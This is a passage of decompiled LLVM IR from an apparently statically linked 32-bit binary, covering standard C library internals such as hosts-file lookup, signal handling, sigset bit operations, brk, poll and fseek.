  %v7_10de0 = inttoptr i32 %v6_10de0 to i32*
  store i32 %v2_10dd4, i32* %v7_10de0, align 4
  %v0_10de4 = load i32, i32* %r2.global-to-local, align 4
  %v1_10de4 = load i32, i32* @r7, align 4
  %v2_10de4 = inttoptr i32 %v1_10de4 to i32*
  store i32 %v0_10de4, i32* %v2_10de4, align 4
  %v0_10dec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10de8

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10de8.preheader, %dec_label_pc_10dd0
  %v0_10df8 = phi i32 [ 1, %dec_label_pc_10de8.preheader ], [ %v0_10dec.pre, %dec_label_pc_10dd0 ]
  store i32 %v2_10d20, i32* %r2.global-to-local, align 4
  %v1_10dec = load i32, i32* @r8, align 4
  %v2_10dec = sub i32 %v0_10df8, %v1_10dec
  %v4_10dec = xor i32 %v1_10dec, %v0_10df8
  %v5_10dec = xor i32 %v2_10dec, %v0_10df8
  %v6_10dec = and i32 %v5_10dec, %v4_10dec
  %v7_10dec = icmp slt i32 %v6_10dec, 0
  %v8_10dec = icmp slt i32 %v2_10dec, 0
  %v4_10df0 = mul i32 %v0_10df8, 4
  %v5_10df0 = add i32 %v4_10df0, %v2_10d20
  store i32 ptrtoint (i32* @global_var_20eac.533 to i32), i32* @r7, align 4
  %v1_10df8 = add i32 %v0_10df8, 1
  store i32 %v1_10df8, i32* @r5, align 4
  %v2_10dfc = xor i1 %v8_10dec, %v7_10dec
  br i1 %v2_10dfc, label %dec_label_pc_10e00, label %dec_label_pc_10e0c

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10de8
  %v2_10e00 = load i32, i32* @global_var_20eac.533, align 4
  store i32 %v2_10e00, i32* @r4, align 4
  %v7_10e08 = icmp slt i32 %v2_10e00, 3
  br i1 %v7_10e08, label %dec_label_pc_10dd0, label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10de8, %dec_label_pc_10e00, %dec_label_pc_10db0
  %v0_10e0c = load i32, i32* @r6, align 4
  store i32 %v0_10e0c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_15640.725 to i32), i32* @r1, align 4
  %v3_10e14 = inttoptr i32 %v0_10e0c to i8*
  %v4_10e14 = call i32 @__GI_strcoll(i8* %v3_10e14, i32 ptrtoint ([7 x i8]* @global_var_15640.725 to i32))
  store i32 %v4_10e14, i32* %r0.global-to-local, align 4
  %v2_10e18 = icmp eq i32 %v4_10e14, 0
  br i1 %v2_10e18, label %dec_label_pc_10e50.preheader, label %dec_label_pc_10e20

dec_label_pc_10e20:                               ; preds = %dec_label_pc_10e0c
  %v0_10e20 = load i32, i32* @r6, align 4
  store i32 %v0_10e20, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_15648.727 to i32), i32* @r1, align 4
  %v3_10e28 = inttoptr i32 %v0_10e20 to i8*
  %v4_10e28 = call i32 @__GI_strcoll(i8* %v3_10e28, i32 ptrtoint ([7 x i8]* @global_var_15648.727 to i32))
  store i32 %v4_10e28, i32* %r0.global-to-local, align 4
  %v2_10e2c = icmp eq i32 %v4_10e28, 0
  br i1 %v2_10e2c, label %dec_label_pc_10e50.preheader, label %dec_label_pc_10eac.backedge

dec_label_pc_10e50.preheader:                     ; preds = %dec_label_pc_10e0c, %dec_label_pc_10e20
  store i32 ptrtoint (i32* @global_var_20eb0.702 to i32), i32* @r4, align 4
  %v2_10e5460 = load i32, i32* @global_var_20eb0.702, align 4
  store i32 ptrtoint (i32* @global_var_20e90.706 to i32), i32* @r5, align 4
  %v1_10e6063 = add i32 %v2_10e5460, -1
  store i32 %v1_10e6063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_10e5460, 1
  br i1 %tmp5964, label %dec_label_pc_10e68, label %dec_label_pc_10e38

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e50.preheader, %dec_label_pc_10e38
  %v1_10e6065 = phi i32 [ %v1_10e60, %dec_label_pc_10e38 ], [ %v1_10e6063, %dec_label_pc_10e50.preheader ]
  %v4_10e38 = mul i32 %v1_10e6065, 4
  %v5_10e38 = add i32 %v4_10e38, ptrtoint (i32* @global_var_20e90.706 to i32)
  %v6_10e38 = inttoptr i32 %v5_10e38 to i32*
  %v7_10e38 = load i32, i32* %v6_10e38, align 4
  store i32 %v7_10e38, i32* @r0, align 4
  store i32 %v1_10e6065, i32* @global_var_20eb0.702, align 4
  %v0_10e40 = call i32 @free()
  store i32 %v0_10e40, i32* %r0.global-to-local, align 4
  %v0_10e44 = load i32, i32* @r4, align 4
  %v1_10e44 = inttoptr i32 %v0_10e44 to i32*
  %v2_10e44 = load i32, i32* %v1_10e44, align 4
  %v1_10e4c = load i32, i32* @r5, align 4
  %v5_10e4c = mul i32 %v2_10e44, 4
  %v6_10e4c = add i32 %v1_10e4c, %v5_10e4c
  %v7_10e4c = inttoptr i32 %v6_10e4c to i32*
  store i32 0, i32* %v7_10e4c, align 4
  store i32 ptrtoint (i32* @global_var_20eb0.702 to i32), i32* @r4, align 4
  %v2_10e54 = load i32, i32* @global_var_20eb0.702, align 4
  store i32 ptrtoint (i32* @global_var_20e90.706 to i32), i32* @r5, align 4
  %v1_10e60 = add i32 %v2_10e54, -1
  store i32 %v1_10e60, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_10e54, 1
  br i1 %tmp59, label %dec_label_pc_10e68, label %dec_label_pc_10e38

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e38, %dec_label_pc_10e50.preheader
  br label %dec_label_pc_10e88

dec_label_pc_10e70:                               ; preds = %dec_label_pc_10ea0
  %v1_10e70 = add i32 %v5_10e90, -36
  %v2_10e70 = inttoptr i32 %v1_10e70 to i32*
  %v3_10e70 = load i32, i32* %v2_10e70, align 4
  store i32 %v3_10e70, i32* %r0.global-to-local, align 4
  %v1_10e74 = inttoptr i32 %v3_10e70 to i8*
  %v2_10e74 = call i32 @__GI_strdup(i8* %v1_10e74)
  store i32 %v2_10e74, i32* %r0.global-to-local, align 4
  %v0_10e7c = load i32, i32* @r4, align 4
  %v1_10e7c = add i32 %v0_10e7c, 1
  store i32 %v1_10e7c, i32* %r2.global-to-local, align 4
  %v5_10e80 = mul i32 %v0_10e7c, 4
  %v6_10e80 = add i32 %v5_10e80, ptrtoint (i32* @global_var_20e90.706 to i32)
  %v7_10e80 = inttoptr i32 %v6_10e80 to i32*
  store i32 %v2_10e74, i32* %v7_10e80, align 4
  %v0_10e84 = load i32, i32* %r2.global-to-local, align 4
  %v1_10e84 = load i32, i32* @r6, align 4
  %v2_10e84 = inttoptr i32 %v1_10e84 to i32*
  store i32 %v0_10e84, i32* %v2_10e84, align 4
  %v0_10e8c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_10e88

dec_label_pc_10e88:                               ; preds = %dec_label_pc_10e68, %dec_label_pc_10e70
  %v0_10e98 = phi i32 [ 1, %dec_label_pc_10e68 ], [ %v0_10e8c.pre, %dec_label_pc_10e70 ]
  store i32 %v2_10d20, i32* %r2.global-to-local, align 4
  %v1_10e8c = load i32, i32* @r8, align 4
  %v2_10e8c = sub i32 %v0_10e98, %v1_10e8c
  %v4_10e8c = xor i32 %v1_10e8c, %v0_10e98
  %v5_10e8c = xor i32 %v2_10e8c, %v0_10e98
  %v6_10e8c = and i32 %v5_10e8c, %v4_10e8c
  %v7_10e8c = icmp slt i32 %v6_10e8c, 0
  %v8_10e8c = icmp slt i32 %v2_10e8c, 0
  %v4_10e90 = mul i32 %v0_10e98, 4
  %v5_10e90 = add i32 %v4_10e90, %v2_10d20
  store i32 ptrtoint (i32* @global_var_20eb0.702 to i32), i32* @r6, align 4
  %v1_10e98 = add i32 %v0_10e98, 1
  store i32 %v1_10e98, i32* @r5, align 4
  %v2_10e9c = xor i1 %v8_10e8c, %v7_10e8c
  br i1 %v2_10e9c, label %dec_label_pc_10ea0, label %dec_label_pc_10eac.backedge

dec_label_pc_10ea0:                               ; preds = %dec_label_pc_10e88
  %v2_10ea0 = load i32, i32* @global_var_20eb0.702, align 4
  store i32 %v2_10ea0, i32* @r4, align 4
  %v7_10ea8 = icmp slt i32 %v2_10ea0, 4
  br i1 %v7_10ea8, label %dec_label_pc_10e70, label %dec_label_pc_10eac.backedge

dec_label_pc_10cdc.preheader:                     ; preds = %dec_label_pc_10cdc.preheader.lr.ph, %dec_label_pc_10eac.backedge
  store i32 %v2_10c70, i32* %r0.global-to-local, align 4
  %v2_10cdc12 = load i8, i8* %v1_10cdc11, align 4
  %v3_10cdc13 = zext i8 %v2_10cdc12 to i32
  store i32 %v3_10cdc13, i32* %r2.global-to-local, align 4
  %v2_10ce014 = icmp eq i8 %v2_10cdc12, 0
  br i1 %v2_10ce014, label %dec_label_pc_10cfc, label %dec_label_pc_10ce8.lr.ph

dec_label_pc_10ce8.lr.ph:                         ; preds = %dec_label_pc_10cdc.preheader
  %v2_10cec.pre = load i32, i32* @global_var_1e7a4, align 4
  br label %dec_label_pc_10ce8

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10eac.backedge, %dec_label_pc_10eac.preheader
  %v0_10ecc = load i32, i32* @sl, align 4
  store i32 %v0_10ecc, i32* %r0.global-to-local, align 4
  %v1_10ed0 = inttoptr i32 %v0_10ecc to i8*
  %v2_10ed0 = call i32 @__GI_fclose(i8* %v1_10ed0)
  store i32 %v2_10ed0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10ee4

dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10cc0
  %v0_10ed8 = call i32 @__GI___h_errno_location()
  store i32 %v0_10ed8, i32* %r0.global-to-local, align 4
  %v2_10ee0 = inttoptr i32 %v0_10ed8 to i32*
  store i32 3, i32* %v2_10ee0, align 4
  br label %dec_label_pc_10ee4

dec_label_pc_10ee4:                               ; preds = %entry, %dec_label_pc_10ecc, %dec_label_pc_10ed8
  store i32 %v2_10c74, i32* @r0, align 4
  %v1_10ef4 = call i32 @__pthread_return_void()
  store i32 %v1_10ef4, i32* %r0.global-to-local, align 4
  store i32 %v6_10c6c, i32* @r5, align 4
  store i32 %v9_10c6c, i32* @r6, align 4
  store i32 %v12_10c6c, i32* @r7, align 4
  store i32 %v15_10c6c, i32* @r8, align 4
  store i32 %v18_10c6c, i32* @sl, align 4
  ret i32 %v1_10ef4

; uselistorder directives
  uselistorder i32 %v3_10cdc13, { 2, 1, 0 }
  uselistorder i32 %v2_10e8c, { 1, 0 }
  uselistorder i32 %v0_10e98, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_10e60, { 1, 0 }
  uselistorder i32 %v1_10e6065, { 1, 0 }
  uselistorder i32 %v2_10dec, { 1, 0 }
  uselistorder i32 %v0_10df8, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_10d28, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_10d6820, { 1, 0, 2 }
  uselistorder i32 %v2_10d20, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_10c70, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 4, 2, 3, 5, 0, 8, 6, 7, 9, 17, 10, 16, 11, 13, 12, 1, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 6, 5, 22, 8, 7, 9, 11, 10, 13, 12, 15, 14, 23, 16, 17, 20, 18, 21, 25, 24, 19, 3, 2, 26, 28, 0, 27 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 ()* @free, { 12, 10, 9, 8, 7, 6, 5, 19, 18, 4, 3, 2, 1, 0, 11, 17, 16, 15, 14, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_20e90.706 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_20eb0.702, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_20eb0.702 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_20ea0.536 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11, 17, 16, 15, 18, 19 }
  uselistorder i32* @global_var_20eac.533, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10ee4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10cdc.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10e88, { 1, 0 }
  uselistorder label %dec_label_pc_10e38, { 1, 0 }
  uselistorder label %dec_label_pc_10e50.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10e0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10de8, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_10d94, { 1, 0 }
  uselistorder label %dec_label_pc_10d90, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10d74, { 1, 0 }
  uselistorder label %dec_label_pc_10d60, { 1, 0 }
  uselistorder label %dec_label_pc_10d40, { 1, 0 }
  uselistorder label %dec_label_pc_10eac.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_10cfc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10eac.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_10f7c = call i32 @__read_etc_hosts_r()
  ret i32 %v0_10f7c
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v3_10f88 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_10f90 = call i32 @__libc_getpid()
  store i32 %v3_10f88, i32* @r4, align 4
  %v0_10f9c = call i32 @kill()
  ret i32 %v0_10f9c

; uselistorder directives
  uselistorder i32 ()* @kill, { 2, 3, 1, 0 }
  uselistorder i32 ()* @__libc_getpid, { 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10fa0 = load i32, i32* @r4, align 4
  store i32 %v3_10fa0, i32* %stack_var_-12, align 4
  %v6_10fa0 = load i32, i32* @r5, align 4
  %v10_10fa0 = ptrtoint i32* %stack_var_-12 to i32
  %v7_10fa4 = icmp eq i32 %arg2, -1
  %v0_10fb0.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v7_10fa4, label %.thread, label %bb

.thread:                                          ; preds = %entry
  br label %dec_label_pc_10fc8

bb:                                               ; preds = %entry
  %v2_10fac = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v0_10fb0.pre, i32* @r4, align 4
  %tmp19 = icmp slt i32 %v0_10fb0.pre, 1
  br i1 %tmp19, label %dec_label_pc_10fc8, label %dec_label_pc_10fb8

dec_label_pc_10fb8:                               ; preds = %bb
  %v7_10fbc = icmp sgt i32 %v0_10fb0.pre, 64
  br i1 %v7_10fbc, label %dec_label_pc_10fc8, label %bb20

bb20:                                             ; preds = %dec_label_pc_10fb8
  store i32 %arg2, i32* %stack_var_-152, align 4
  store i32 31, i32* %r0.global-to-local, align 4
  %v5_10fec24 = add i32 %v10_10fa0, 124
  store i32 %v5_10fec24, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10fdc

dec_label_pc_10fc8:                               ; preds = %.thread, %dec_label_pc_10fb8, %bb
  %v0_10fc8 = call i32 @__errno_location()
  store i32 %v0_10fc8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10fd4 = inttoptr i32 %v0_10fc8 to i32*
  store i32 22, i32* %v2_10fd4, align 4
  %v0_11048.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11048

dec_label_pc_10fdc:                               ; preds = %bb20, %dec_label_pc_10fdc
  %v5_10fec25 = phi i32 [ %v5_10fec24, %bb20 ], [ %v5_10fec, %dec_label_pc_10fdc ]
  %v2_10fe0 = add i32 %v5_10fec25, -136
  %v3_10fe0 = inttoptr i32 %v2_10fe0 to i32*
  store i32 0, i32* %v3_10fe0, align 4
  %v0_10fe4.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_10fe4 = add i32 %v0_10fe4.pre, -1
  store i32 %v1_10fe4, i32* %r0.global-to-local, align 4
  %v6_10fe4 = icmp slt i32 %v1_10fe4, 0
  %v4_10fec = mul i32 %v1_10fe4, 4
  %v5_10fec = add i32 %v4_10fec, %v10_10fa0
  store i32 %v5_10fec, i32* %r2.global-to-local, align 4
  br i1 %v6_10fe4, label %dec_label_pc_10ff4, label %dec_label_pc_10fdc

dec_label_pc_10ff4:                               ; preds = %dec_label_pc_10fdc
  %v2_10ff4 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_10ff4, i32* @r5, align 4
  %v2_10ff8 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_10ff8, i32* %r0.global-to-local, align 4
  %v0_10ffc = load i32, i32* @r4, align 4
  %v2_11000 = call i32 @__sigaddset(i32 %v2_10ff8, i32 %v0_10ffc)
  store i32 %v2_11000, i32* %r0.global-to-local, align 4
  %v1_11004 = icmp slt i32 %v2_11000, 0
  br i1 %v1_11004, label %dec_label_pc_11044, label %dec_label_pc_1100c

dec_label_pc_1100c:                               ; preds = %dec_label_pc_10ff4
  %v0_1100c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_20eb4.732 to i32), i32* %r0.global-to-local, align 4
  %v2_11014 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_20eb4.732 to i32), i32 %v0_1100c)
  store i32 %v2_10fac, i32* %r2.global-to-local, align 4
  %v0_1102c = load i32, i32* @r4, align 4
  store i32 %v0_1102c, i32* %r0.global-to-local, align 4
  %v4_11034 = call i32 @__libc_sigaction(i32 %v0_1102c, i32* nonnull %stack_var_-152, i32 %v2_10fac)
  store i32 %v4_11034, i32* %r0.global-to-local, align 4
  %v1_11038 = icmp slt i32 %v4_11034, 0
  br i1 %v1_11038, label %dec_label_pc_11044, label %bb23

bb23:                                             ; preds = %dec_label_pc_1100c
  %v5_1103c = load i32, i32* %stack_var_-292, align 4
  store i32 %v5_1103c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11048

dec_label_pc_11044:                               ; preds = %dec_label_pc_1100c, %dec_label_pc_10ff4
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11048

dec_label_pc_11048:                               ; preds = %bb23, %dec_label_pc_10fc8, %dec_label_pc_11044
  %v0_11048 = phi i32 [ %v5_1103c, %bb23 ], [ %v0_11048.pre, %dec_label_pc_10fc8 ], [ -1, %dec_label_pc_11044 ]
  store i32 %v0_11048, i32* %r0.global-to-local, align 4
  %v2_11050 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11050, i32* @r4, align 4
  store i32 %v6_10fa0, i32* @r5, align 4
  ret i32 %v0_11048

; uselistorder directives
  uselistorder i32 %v0_11048, { 1, 0 }
  uselistorder i32 %v5_10fec, { 1, 0 }
  uselistorder i32 %v1_10fe4, { 0, 2, 1 }
  uselistorder i32 %v2_10fac, { 1, 0 }
  uselistorder i32 %v0_10fb0.pre, { 1, 0, 2 }
  uselistorder i32 %v10_10fa0, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 0, 2, 1 }
  uselistorder i32* %stack_var_-152, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 6, 10, 7, 9, 8, 11, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, i32)* @__sigaddset, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_11048, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10fdc, { 1, 0 }
  uselistorder label %dec_label_pc_10fc8, { 1, 2, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_11058 = add i32 %arg2, -1
  %v3_1105c = udiv i32 %v1_11058, 32
  %v4_11060 = mul nuw nsw i32 %v3_1105c, 4
  %v5_11060 = add i32 %v4_11060, %arg1
  %v6_11060 = inttoptr i32 %v5_11060 to i32*
  %v7_11060 = load i32, i32* %v6_11060, align 4
  %v1_11064 = urem i32 %v1_11058, 32
  %v7_1106c = shl i32 1, %v1_11064
  %v8_1106c = and i32 %v7_11060, %v7_1106c
  %v10_1106c = icmp ne i32 %v8_1106c, 0
  %. = zext i1 %v10_1106c to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_11058, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1107c = add i32 %arg2, -1
  %v3_11080 = udiv i32 %v1_1107c, 32
  %v4_11084 = mul nuw nsw i32 %v3_11080, 4
  %v5_11084 = add i32 %v4_11084, %arg1
  %v6_11084 = inttoptr i32 %v5_11084 to i32*
  %v7_11084 = load i32, i32* %v6_11084, align 4
  %v1_11088 = urem i32 %v1_1107c, 32
  %v7_11090 = shl i32 1, %v1_11088
  %v8_11090 = or i32 %v7_11084, %v7_11090
  store i32 %v8_11090, i32* %v6_11084, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1107c, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_110a0 = add i32 %arg2, -1
  %v3_110a4 = udiv i32 %v1_110a0, 32
  %v4_110a8 = mul nuw nsw i32 %v3_110a4, 4
  %v5_110a8 = add i32 %v4_110a8, %arg1
  %v6_110a8 = inttoptr i32 %v5_110a8 to i32*
  %v7_110a8 = load i32, i32* %v6_110a8, align 4
  %v1_110ac = urem i32 %v1_110a0, 32
  %tmp = shl i32 -1, %v1_110ac
  %v8_110b4 = add i32 %tmp, -1
  %v9_110b4 = and i32 %v7_110a8, %v8_110b4
  store i32 %v9_110b4, i32* %v6_110a8, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_110a0, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_110c4 = add i32 %arg1, 28
  %v2_110c4 = inttoptr i32 %v1_110c4 to i32*
  %v3_110c4 = load i32, i32* %v2_110c4, align 4
  %v1_110cc = add i32 %arg1, 44
  %v2_110cc = inttoptr i32 %v1_110cc to i32*
  %v3_110cc = load i32, i32* %v2_110cc, align 4
  store i32 %v3_110c4, i32* @global_var_20f34.734, align 4
  store i32 %v3_110cc, i32* @global_var_20f38.736, align 4
  ret i32 %arg1
}

define i32 @__GI_brk(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_110f0 = call i32 @brk(i32* %arg1)
  %v3_110f4 = icmp ult i32 %v2_110f0, %tmp
  store i32 %v2_110f0, i32* @global_var_20e4c.663, align 4
  br i1 %v3_110f4, label %dec_label_pc_11108, label %dec_label_pc_11118

dec_label_pc_11108:                               ; preds = %entry
  %v0_11108 = call i32 @__errno_location()
  %v2_11110 = inttoptr i32 %v0_11108 to i32*
  store i32 12, i32* %v2_11110, align 4
  br label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %entry, %dec_label_pc_11108
  %v0_11118 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_11108 ]
  ret i32 %v0_11118

; uselistorder directives
  uselistorder i32* @global_var_20e4c.663, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11118, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_11128 = load i32, i32* @r0, align 4
  %v0_1112c = call i32 @__errno_location()
  %v1_11130 = sub i32 0, %v0_11128
  %v2_11134 = inttoptr i32 %v0_1112c to i32*
  store i32 %v1_11130, i32* %v2_11134, align 4
  ret i32 -1
}

define i32 @__libc_poll(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11140 = load i32, i32* @r4, align 4
  store i32 %v3_11140, i32* %stack_var_-8, align 4
  %v5_11144 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_11144, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_11144, -4095
  br i1 %tmp, label %dec_label_pc_11164, label %dec_label_pc_11154

dec_label_pc_11154:                               ; preds = %entry
  %v0_11154 = call i32 @__errno_location()
  %v0_11158 = load i32, i32* %r4.global-to-local, align 4
  %v1_11158 = sub i32 0, %v0_11158
  %v2_1115c = inttoptr i32 %v0_11154 to i32*
  store i32 %v1_11158, i32* %v2_1115c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11164

dec_label_pc_11164:                               ; preds = %entry, %dec_label_pc_11154
  %v0_11164 = phi i32 [ %v5_11144, %entry ], [ -1, %dec_label_pc_11154 ]
  %v2_11168 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11168, i32* @r4, align 4
  ret i32 %v0_11164

; uselistorder directives
  uselistorder i32 %v5_11144, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11164, { 1, 0 }
}

define i32 @__GI_fseek() local_unnamed_addr {
entry:
  %v0_1116c = load i32, i32* @r2, align 4
  store i32 %v0_1116c, i32* @r3, align 4
  %v0_11174 = call i32 @__GI_fseeko64()
  ret i32 %v0_11174
}

define i32 @__GI_fseeko64() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_11178 = load i32, i32* @r4, align 4
  %v6_11178 = load i32, i32* @r5, align 4
  %v9_11178 = load i32, i32* @r6, align 4
  %v0_1117c = load i32, i32* @r3, align 4
  %v2_11180 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_1117c, i32* @r6, align 4
  %v0_11188 = load i32, i32* @r0, align 4
  store i32 %v0_11188, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_1117c, 3
  br i1 %tmp, label %dec_label_pc_111a4, label %dec_label_pc_11190

dec_label_pc_11190:                               ; preds = %entry
  %v0_11190 = call i32 @__errno_location()
  store i32 %v0_11190, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_1119c = inttoptr i32 %v0_11190 to i32*
  store i32 22, i32* %v2_1119c, align 4
  br label %.thread3

dec_label_pc_111a4:                               ; preds = %entry
  %v1_111a4 = add i32 %v0_11188, 52
  %v2_111a4 = inttoptr i32 %v1_111a4 to i32*
  %v3_111a4 = load i32, i32* %v2_111a4, align 4
  store i32 %v3_111a4, i32* %r7.global-to-local, align 4
  %v2_111a8 = icmp eq i32 %v3_111a4, 0
  %v0_111ac = load i32, i32* @r1, align 4
  store i32 %v0_111ac, i32* %stack_var_-28, align 4
  br i1 %v2_111a8, label %dec_label_pc_111b8, label %dec_label_pc_111e4

dec_label_pc_111b8:                               ; preds = %dec_label_pc_111a4
  %v1_111b8 = add i32 %v0_11188, 56
  store i32 %v1_111b8, i32* @r4, align 4
  store i32 58724, i32* %r3.global-to-local, align 4
  store i32 %v2_11180, i32* @r0, align 4
  store i32 %v1_111b8, i32* %r2.global-to-local, align 4
  %v1_111d0 = call i32 @__pthread_return_void()
  %v0_111d4 = load i32, i32* @r4, align 4
  store i32 %v0_111d4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_e55c.405 to i32), i32* %r3.global-to-local, align 4
  store i32 70116, i32* @lr, align 4
  %v1_111e0 = call i32 @__pthread_return_0()
  store i32 %v1_111e0, i32* %r0.global-to-local, align 4
  %v0_111e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %dec_label_pc_111a4, %dec_label_pc_111b8
  %v0_111f0 = phi i32 [ %v0_11188, %dec_label_pc_111a4 ], [ %v0_111e4.pre, %dec_label_pc_111b8 ]
  %v1_111e4 = inttoptr i32 %v0_111f0 to i8*
  %v2_111e4 = load i8, i8* %v1_111e4, align 1
  %v3_111e4 = zext i8 %v2_111e4 to i32
  store i32 %v3_111e4, i32* %r3.global-to-local, align 4
  %v1_111e8 = and i32 %v3_111e4, 64
  %v2_111e8 = icmp eq i32 %v1_111e8, 0
  br i1 %v2_111e8, label %dec_label_pc_11200, label %dec_label_pc_111f0

dec_label_pc_111f0:                               ; preds = %dec_label_pc_111e4
  store i32 %v0_111f0, i32* @r0, align 4
  %v0_111f4 = call i32 @__stdio_wcommit()
  store i32 %v0_111f4, i32* %r0.global-to-local, align 4
  %v2_111f8 = icmp eq i32 %v0_111f4, 0
